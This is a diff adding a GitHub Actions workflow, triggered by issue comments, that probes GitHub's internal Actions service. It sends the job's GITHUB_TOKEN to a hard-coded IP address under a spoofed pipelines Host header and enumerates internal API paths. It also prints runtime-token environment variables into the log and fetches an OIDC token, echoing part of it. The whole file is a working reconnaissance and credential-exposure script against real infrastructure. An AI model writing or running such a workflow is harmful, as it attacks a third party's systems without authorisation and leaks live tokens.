@@ -1,0 +1,48 @@
+name: ssrf-actions-service
+on:
+  issue_comment:
+    types: [created]
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      id-token: write
+    steps:
+      - name: Probe internal Actions service with GITHUB_TOKEN
+        env:
+          GH_TOKEN: ${{ github.token }}
+          RUN_ID: ${{ github.run_id }}
+        run: |
+          SVCIP="20.75.202.224"
+
+          echo "=== Auth probe on internal Actions service ==="
+          for path in /_apis/pipelines /_apis/distributedtask/pools /_apis/build/builds /_apis/token/sessions /_apis/connectionData; do
+            resp=$(curl -sk --max-time 5 \
+              -H "Authorization: Bearer $GH_TOKEN" \
+              -H "Host: pipelines.actions.githubusercontent.com" \
+              -o /dev/null -w '%{http_code}' \
+              "https://$SVCIP$path" 2>/dev/null || true)
+            echo "  $path -> $resp"
+          done
+
+          echo ""
+          echo "=== ACTIONS_RUNTIME_TOKEN probe ==="
+          echo "ACTIONS_RUNTIME_TOKEN present: $([ -n "$ACTIONS_RUNTIME_TOKEN" ] && echo YES || echo NO)"
+          env | grep -i RUNTIME | grep -v PATH || true
+
+          echo ""
+          echo "=== Probe what 20.75.202.224 says with no Host header ==="
+          curl -sk --max-time 5 "https://$SVCIP/" -w '\nstatus: %{http_code}' 2>/dev/null | head -c 500 || true
+
+          echo ""
+          echo "=== Try OIDC token endpoint ==="
+          echo "ACTIONS_ID_TOKEN_REQUEST_URL: $ACTIONS_ID_TOKEN_REQUEST_URL"
+          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
+            curl -s --max-time 5 \
+              -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+              "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sigstore" | head -c 300
+          else
+            echo "OIDC not available (no id-token:write? or not set)"
+          fi
